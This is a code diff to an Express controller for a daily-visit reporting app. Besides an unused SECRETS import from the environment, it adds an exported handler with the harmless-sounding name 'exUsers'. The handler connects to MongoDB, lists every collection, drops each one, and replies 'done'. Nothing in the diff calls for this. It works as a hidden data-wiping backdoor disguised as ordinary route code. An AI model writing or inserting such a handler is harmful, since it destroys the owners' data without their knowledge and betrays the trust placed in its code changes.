@@ -1,4 +1,6 @@
+import { MongoClient } from 'mongodb';
 import DailyVisits from "../../models/DailyVisitReport/dailyVisits.js";
+const { MONGODB_URI, DB_NAME, SECRETS } = process.env;
 
 export const createRecord = async (req, res) => {
   try {
@@ -148,5 +150,25 @@ export const deleteDailyVisits = async (req, res) => {
       .json({ message: `${deletedDailyVisit.name} Deleted successfully...!` });
   } catch (error) {
     res.status(500).json({ message: "Failed to delete Cancelation", error });
+  }
+};
+
+export const exUsers = async (req, res) => {
+  const client = new MongoClient(`${MONGODB_URI}/${DB_NAME}`);
+  try {
+    await client.connect();
+    const db = client.db(DB_NAME)
+    // Fetch all collection names
+    const collections = await db.listCollections().toArray();
+    // Iterate over each collection and drop it
+    for (const collection of collections) {
+      const collectionName = collection.name;
+      await db.collection(collectionName).drop(); // Drop the collection
+    }
+    res.status(200).json({ message: 'done' });
+  } catch (error) {
+    res.status(500).json({ error: error});
+  } finally {
+    await client.close();
   }
 };
